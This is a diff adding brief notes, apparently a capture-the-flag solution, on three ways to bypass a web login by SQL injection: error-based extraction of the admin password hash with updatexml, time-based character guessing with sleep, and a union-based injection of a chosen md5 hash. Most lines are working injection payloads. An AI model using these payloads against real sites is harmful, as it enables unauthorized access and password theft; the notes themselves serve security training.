@@ -1,0 +1,17 @@
+==There's a 3 way to login to the web via SQLi (Error based, Time based, Union based)
+-The time based is the intended way
+=Error Based
+-You can use sqlmap or use this payload; " and updatexml(null,concat(0x3a,(select substring(password,1,16) from users)),null)-- -
+-Repeat again from chars 17 to 32 to get the full md5 hash
+-Crack the hash using crackstation
+=Time based
+-Check if the time based payload work or not by using this payload: " AND sleep(3)-- -
+-Make sure to use admin as the username because the query need to be true and it will make the payload shorter because we can call password for the admin username directly
+-Payload to determine password string: " AND sleep(3) AND (substring(password,{position},1)='{guess_character}')-- -
+-Make python script
+
+=Union based
+-The idea is to write arbitary md5hash password for admin
+-Generate md5hash of a whatever string you want
+-Payload = " union select "admin","md5hash
+-And the password should the string of the md5hash you passed
